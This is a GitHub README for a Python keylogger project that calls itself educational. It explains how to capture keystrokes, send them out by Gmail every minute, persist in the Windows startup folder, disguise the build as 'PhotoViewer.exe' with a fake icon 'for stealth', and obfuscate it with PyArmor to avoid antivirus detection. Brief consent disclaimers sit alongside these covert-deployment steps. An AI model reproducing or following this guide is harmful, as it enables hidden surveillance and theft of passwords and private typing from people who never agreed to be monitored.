# KeyLogger-Edu

## Overview
KeyLogger-Edu is a Python-based proof-of-concept project by **Pratham Mejari** designed for educational purposes to demonstrate keyboard event logging. It captures keystrokes, saves them to a local file (`keylog.txt`), and sends them via email using Gmail's SMTP server. This project is intended for learning about input monitoring, threading, and ethical security testing in a controlled environment.

**⚠️ Important**: This tool must only be used with explicit user consent or for authorized security testing. Unauthorized keylogging is illegal and unethical. Pratham Mejari and contributors are not responsible for misuse.

## Features
- Captures keystrokes (letters, spaces, Enter, Backspace, etc.) using the `pynput` library.
- Logs keystrokes to `keylog.txt` in the same directory as the script.
- Sends logged keystrokes via email every 60 seconds using Gmail's SMTP server.
- Includes startup persistence for Windows (copies to startup folder for auto-run on boot).
- Reports the executable’s file location via email for debugging.
- Can be compiled into a standalone executable for systems without Python.

## Prerequisites
- **Python 3.8–3.10** (for running the script directly).
- **pynput**: `pip install pynput` (for key event handling).
- **PyInstaller**: `pip install pyinstaller` (for creating executables).
- **PyArmor** (optional): `pip install pyarmor` (for antivirus evasion).
- **Gmail Account**: For sending emails, with an App Password enabled.
- A system with Python installed for development (not required on the target system if compiled).

## Setup Instructions
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/pratham-mejari/KeyLogger-Edu.git
   cd KeyLogger-Edu
   ```

2. **Install Dependencies**:
   ```bash
   pip install pynput
   ```

3. **Configure Email Settings**:
   - Open `key.py` and update the following lines with your Gmail details:
     ```python
     EMAIL_ADDRESS = "your_email@gmail.com"  # Your Gmail address
     EMAIL_PASSWORD = "your_app_password"    # Your Gmail App Password
     TO_EMAIL = "receiver_email@gmail.com"  # Where logs are sent
     ```
   - To get a Gmail App Password:
     - Go to [myaccount.google.com](https://myaccount.google.com) > Security.
     - Enable **2-Step Verification**.
     - Go to **App Passwords**, select “Other” (e.g., “KeyLogger”), and generate a 16-character password (e.g., `xxxx yyyy zzzz wwww`).
     - Copy this into `EMAIL_PASSWORD`.

4. **Run the Script**:
   ```bash
   python3 key.py
   ```
   - Type some keys to test. Check `keylog.txt` in the same directory and your `TO_EMAIL` inbox (including spam/junk) for emails with subject “Keylog Update” or “Keylogger Location Report”.

## Making the Script Executable
To run the keylogger on a system without Python or `pynput`, compile it into a standalone executable using PyInstaller. This bundles Python, `pynput`, and all dependencies into a single file (e.g., `.exe` for Windows or a binary for Linux).

### Steps to Create an Executable
1. **Install PyInstaller**:
   ```bash
   pip install pyinstaller
   ```

2. **Compile the Script**:
   - For Windows targets (recommended for stealth):
     ```bash
     pyinstaller --onefile --noconsole --name PhotoViewer key.py
     ```
     - `--onefile`: Creates a single `.exe` (e.g., `PhotoViewer.exe`).
     - `--noconsole`: Prevents a command window from appearing (Windows only).
     - Output: `./dist/PhotoViewer.exe`.
   - For Linux targets:
     ```bash
     pyinstaller --onefile --name PhotoViewer key.py
     ```
     - Output: `./dist/PhotoViewer`.
     - Note: Update `LOG_FILE = "/tmp/keylog.txt"` in `key.py` to avoid permission issues on Linux.

3. **Optional: Change the Icon** (Windows):
   - Download an `.ico` file (e.g., from [iconarchive.com](https://www.iconarchive.com)) to make the executable look like a legitimate app (e.g., a camera or game icon).
   - Run:
     ```bash
     pyinstaller --onefile --noconsole --name PhotoViewer --icon=/path/to/icon.ico key.py
     ```

4. **Optional: Avoid Antivirus Detection**:
   - Some antivirus software may flag the executable due to its keylogging behavior. To reduce detection, obfuscate with PyArmor:
     ```bash
     pip install pyarmor
     pyarmor pack key.py
     ```
     - Output: An obfuscated executable in `./dist`.
   - Test on a system with antivirus to ensure it runs undetected.

5. **Test the Executable**:
   - Copy `PhotoViewer.exe` (Windows) or `PhotoViewer` (Linux) to a test system without Python or `pynput`.
   - Run it:
     - Windows: Double-click `PhotoViewer.exe`.
     - Linux: `chmod +x PhotoViewer && ./PhotoViewer`.
   - Verify:
     - `keylog.txt` is created in the same directory (or `/tmp/keylog.txt` on Linux).
     - Emails are sent to `TO_EMAIL` with subjects “Keylog Update” (keystrokes) and “Keylogger Location Report” (file locations).
     - On Windows, check `C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\PhotoViewer.exe` for the startup copy.

## How It Works
- **Key Logging**: Captures keystrokes using `pynput` and saves them to `keylog.txt`.
- **Email Sending**: Every 60 seconds, sends `keylog.txt` contents to `TO_EMAIL` via Gmail’s SMTP server.
- **Startup Persistence**: On Windows, copies `PhotoViewer.exe` to the startup folder to run on boot.
- **Location Reporting**: Sends an initial email with the paths of the original and startup copies of the executable.

## Ethical Considerations
- **Use with Consent**: Only run this on systems you own or have explicit permission to monitor. Unauthorized keylogging is illegal in many jurisdictions and violates privacy laws.
- **Educational Purpose**: This project is for learning about Python, key event handling, threading, and SMTP integration.
- **GitHub Compliance**: Ensure compliance with GitHub’s [Acceptable Use Policies](https://docs.github.com/en/site-policy/acceptable-use-policies/github-acceptable-use-policies). Malicious use may lead to repository suspension.

## Troubleshooting
- **No Emails**:
  - Verify `EMAIL_ADDRESS`, `EMAIL_PASSWORD` (App Password), and `TO_EMAIL` are correct.
  - Check spam/junk folder in `TO_EMAIL`.
  - Test email setup with:
    ```python
    import smtplib
    from email.mime.text import MIMEText
    msg = MIMEText("Test email")
    msg['Subject'] = 'Test'
    msg['From'] = "your_email@gmail.com"
    msg['To'] = "receiver_email@gmail.com"
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login("your_email@gmail.com", "your_app_password")
        server.sendmail("your_email@gmail.com", "receiver_email@gmail.com", msg.as_string())
    ```
- **No Logs**:
  - Ensure `pynput` is installed for script mode (`pip install pynput`).
  - On Linux, run `xhost +local:root` if key capture fails as root.
  - Check file permissions for `keylog.txt`.
- **Antivirus Flags Executable**:
  - Use PyArmor or compile on a Windows machine for better evasion.
  - Test on a clean virtual machine to identify antivirus triggers.

## License
This project is licensed under the MIT License. See the `LICENSE` file for details.

## Author
- **Pratham Mejari**

## Disclaimer
This is an educational tool developed by Pratham Mejari for learning purposes. The author is not responsible for any misuse or damage caused by this software. Use responsibly and legally.